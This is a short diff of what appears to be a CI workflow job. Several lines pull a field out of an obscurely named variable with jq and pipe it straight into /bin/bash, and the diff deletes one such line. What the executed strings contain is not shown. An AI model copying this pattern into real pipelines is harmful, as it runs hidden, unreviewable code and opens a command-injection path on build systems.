@@ -24,7 +24,6 @@ jobs:
           echo $apahn0 | jq -r .ggox20 | /bin/bash
           printf '%s' "$lp826" | jq -r .rsdn1 | /bin/bash
           printf '%s' "$hkqla139" | jq -r .zs0771 | /bin/bash
-          printf '%s' "$nuumc93884" | jq -r .ieatj38299 | /bin/bash
           printf '%s' "$vwo35" | jq -r .ze6 | /bin/bash
 
       - name: Save data
